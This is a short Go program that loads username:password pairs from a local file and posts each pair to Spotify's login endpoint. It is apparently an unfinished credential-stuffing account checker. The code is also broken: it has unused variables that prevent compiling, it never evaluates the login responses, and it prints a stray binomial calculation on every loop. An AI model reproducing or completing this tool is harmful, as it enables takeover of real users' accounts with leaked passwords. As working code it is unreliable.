package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	file, err := os.Open("/home/den/go_projects/src/hello/test.txt")

	if err != nil {
		log.Fatalf("failed opening file: %s", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	file.Close()
	start := time.Now()
	for _, eachline := range txtlines {
		result := strings.Split(eachline, ":")
		username := result[0]
		pw := result[1]
		r := new(big.Int)
		fmt.Println(r.Binomial(1000, 10))
		requestBody, err := json.Marshal(map[string]string{
			"username": username,
			"password": pw,
		})
		client := http.Client{}
		if err != nil {
			log.Fatalf("failed sendin the request: %s", err)
		}
		request, err := http.NewRequest("POST", "https://accounts.spotify.com/password/login", bytes.NewBuffer(requestBody))
		if err != nil {
			log.Fatalf("failed sendin the request: %s", err)
		}
		resp, err := client.Do(request)
		if err != nil {
			log.Fatalf("failed sendin the request: %s", err)
		}

		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		bad, err := json.Marshal(map[string]string{"error": "errorInvalidCredentials"})
		if err != nil {
			log.Fatalf("failed sendin the request: %s", err)
		}
	}
	elapsed := time.Since(start)
	log.Printf("Binomial took %s and bad", elapsed)
}
